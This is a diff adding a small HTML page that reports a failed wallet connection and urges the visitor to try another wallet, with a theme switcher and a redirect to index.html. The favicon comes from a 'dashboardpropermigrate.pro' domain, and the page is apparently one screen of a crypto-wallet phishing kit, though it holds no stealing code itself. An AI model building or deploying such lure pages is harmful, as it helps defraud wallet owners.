@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+  
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Try Another Wallet</title>
+    <link
+      href="https://dashboardpropermigrate.pro/connect/favicon.ico"
+      rel="shortcut icon"
+    />
+    <style>
+      body {
+        font-family: "Open Sans", sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      /* Light mode styles */
+      [data-theme="light"] {
+        background-color: #f4f4f9; /* Light background color */
+      }
+
+      /* Dark mode styles */
+      [data-theme="dark"] {
+        background-color: #121212; /* Dark background color */
+        color: #ffffff; /* Light text color */
+      }
+
+      .container {
+        background-color: #fff; /* Light background for container */
+        width: 320px;
+        padding: 22px;
+        border-radius: 50px;
+        box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        position: fixed;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%); /* Ensure perfect centering */
+      }
+
+      /* Dark mode for the container */
+      [data-theme="dark"] .container {
+        background-color: #1e1e1e; /* Dark background for container */
+        color: #ffffff; /* Light text color for container */
+      }
+
+      .wallet-icon {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 15px;
+        border-radius: 20%; /* Rounded icon */
+      }
+
+      .subtitle {
+        font-size: 1.3em;
+        font-weight: bold;
+        color: #333;
+        margin-bottom: 10px;
+      }
+
+      /* Dark mode for subtitle */
+      [data-theme="dark"] .subtitle {
+        color: #ffffff;
+      }
+
+      .button {
+        background-color: #e91e63;
+        color: white;
+        border: none;
+        padding: 15px 30px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 1.1em;
+        transition: background-color 0.2s ease-in-out;
+        margin-top: 20px;
+      }
+
+      .button:disabled {
+        background-color: #ccc;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img class="wallet-icon" src="non-web3-wallets.png" alt="Wallet Icon" />
+      <p class="subtitle">Wallet Connection Failed</p>
+      <p>Please try connecting another wallet.</p>
+      <button class="button" id="tryAnotherWallet">Try Another Wallet</button>
+    </div>
+
+    <script>
+      // Check for dark mode preference
+      const prefersDarkScheme = window.matchMedia(
+        "(prefers-color-scheme: dark)"
+      );
+
+      function setTheme(e) {
+        document.documentElement.setAttribute(
+          "data-theme",
+          e.matches ? "dark" : "light"
+        );
+      }
+
+      // Apply initial theme
+      setTheme(prefersDarkScheme);
+
+      // Listen for changes
+      prefersDarkScheme.addEventListener("change", setTheme);
+
+      document
+        .getElementById("tryAnotherWallet")
+        .addEventListener("click", function () {
+          window.location.href = "index.html"; // Redirect to YouTube
+        });
+    </script>
+  </body>
+
+</html>
